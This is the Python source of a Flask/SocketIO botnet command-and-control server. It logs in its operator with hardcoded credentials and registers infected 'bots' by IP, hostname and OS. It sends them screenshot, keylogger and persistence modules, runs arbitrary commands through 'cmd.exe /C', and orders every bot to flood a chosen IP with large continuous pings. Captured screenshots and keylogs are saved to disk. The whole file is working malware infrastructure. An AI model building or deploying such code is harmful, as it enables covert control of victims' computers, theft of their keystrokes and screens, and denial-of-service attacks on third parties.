#Server.py

from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from flask_socketio import SocketIO, emit

app = Flask(__name__)
server = SocketIO(app)
app.secret_key = 'Fixer'

USERNAME = 'Leopard'
PASSWORD = 'leopard79864506'
idNumber = 0
database = []
completedTasks = []
command_output = 'COMMAND OUTPUT'
ping_output_list = []
screenshotNumber = 0
keyloggerNumber = 0

class Client:
    def __init__(self, info):
        global idNumber
        self.idNumber = idNumber
        idNumber += 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.sid = info['sid']
        self.status = "Alive"

class TaskDone:
    def __init__(self, info):
        self.idNumber = info['idNumber']
        self.hostname = info['hostname']
        self.command = info['command']
        self.status = info['DATA']

@app.route('/')
def redirectLogin():
    return redirect(url_for('login'))

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form.get('userid')
        password = request.form.get('passid')
        if username == USERNAME and password == PASSWORD:
            session['loggedin'] = True
            session['username'] = USERNAME
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html')
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if session.get('loggedin'):
        return render_template('dashboard.html', database=database)
    return redirect(url_for('login'))

@app.route('/modules', methods=['GET', 'POST'])
def modules():
    if session.get('loggedin'):
        commandStatus = None
        if request.method == 'POST':
            idNumber = request.form.get('idNumber')
            command = request.form.get('command')
            hostname = None

            if idNumber:
                client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
                if client_info:
                    hostname = client_info.hostname
                else:
                    return "ERROR: BOT with Provided BOT-ID not Found"
                send_modules(idNumber, command, hostname)
                return render_template('modules.html', taskDb=completedTasks, commandStatus=commandStatus)
            else:
                return "ERROR : Bot ID not provided"

        return render_template('modules.html', taskDb=completedTasks, commandStatus=commandStatus)
    return redirect(url_for('login'))

def send_modules(idNumber, command, hostname):
    if command not in ['screenshot', 'persistence', 'keylogger']:
        return "ERROR : Invalid Modules Command Provided"
    server.emit('module', {'idNumber': idNumber, 'command': command, 'hostname': hostname})

@server.on('module_output')
def handle_modules_output(module_output):
    idNumber = module_output.get('idNumber')
    command = module_output.get('command')
    hostname = module_output.get('hostname')
    status = module_output.get('DATA')
    completedTasks.append(TaskDone({'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': status}))

@app.route('/commands', methods=['GET'])
def commands():
    if not session.get('loggedin'):
        return redirect(url_for('login'))

    idNumber = request.args.get('idNumber')
    command = request.args.get('command')

    if idNumber and command:
        client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
        if client_info:
            hostname = client_info.hostname
            send_commands(idNumber, command, hostname)
            global command_output
            return render_template('commands.html', commands_output=command_output)
        else:
            return jsonify({'ERROR': 'BOT with provided BOT-ID not found'}), 404
    else:
        return render_template('commands.html', commands_output="Please Send a Command First")

def send_commands(idNumber, command, hostname):
    client = next((c for c in database if c.idNumber == int(idNumber)), None)
    if not client:
        return f"ERROR : Bot with BOT-ID {idNumber} not found"
    else:
        command = f"cmd.exe /C {command}"
        server.emit('commands', {'idNumber': idNumber, 'command': command, 'hostname': hostname})

@server.on('commands_output')
def handle_commands_output(commands_output):
    global command_output
    command_output = commands_output.get('output')

@app.route('/ping', methods=['GET'])
def ping():
    ip_address = request.args.get('target_ip')
    if ip_address:
        send_ping(ip_address)
        global ping_output_list
        return render_template('ping.html', output=ping_output_list)
    return render_template('ping.html')

def send_ping(ip_address):
    for client in database:
        idNumber = client.idNumber
        command = f'ping {ip_address} -t -l 65500'
        server.emit('ping', {'idNumber': idNumber, 'ip_address' : ip_address, 'command': command})

@server.on('ping_output')
def handle_ping_output(ping_output):
    idNumber = ping_output.get('idNumber')
    output = ping_output.get('output')
    client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
    if client_info:
        hostname = client_info.hostname
        ping_output_list.append({'idNumber': idNumber, 'hostname': hostname, 'output': output})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@server.on('connect')
def onConnect():
    pass

@server.on('Initial_Information')
def handleInformation(Initial_Information):
        database.append(Client(Initial_Information))

@server.on('message')
def handleMessage(message):
    command = message.get('COMMAND')
    if command == 'OUTPUT':
        if 'persistence' in message['command']:
            if message['PV']:
                for x in database:
                    if x.idNumber == message['idNumber']:
                        x.persistence = True

            if "screenshot" in message['command']:
                global screenshotNumber
                with open(f'./Data/Screenshots/screenshot_{screenshotNumber}.png', 'wb') as f:
                    f.write(message['DATA'])
                    tmp = f'/Data/Screenshots/screenshot_{screenshotNumber}.png'
                    message['DATA'] = tmp
                    screenshotNumber += 1

            if 'keylogger' in message['command']:
                global keyloggerNumber
                with open(f'./Data/Keylogs/keylogs_{keyloggerNumber}.txt', 'w') as f:
                    f.write(message['DATA'])
                    tmp = f'/Data/Keylogs/keylogs_{keyloggerNumber}.txt'
                    message['DATA'] = tmp
                    keyloggerNumber += 1
            else:
                message['DATA'] = message['DATA'].decode("utf-8")

            for x in database:
                if x.idNumber == message['idNumber']:
                    x.tasks.append(message)
    emit('message', message, broadcast=True)

if __name__ == '__main__':
    server.run(app, host='0.0.0.0', port=5000)
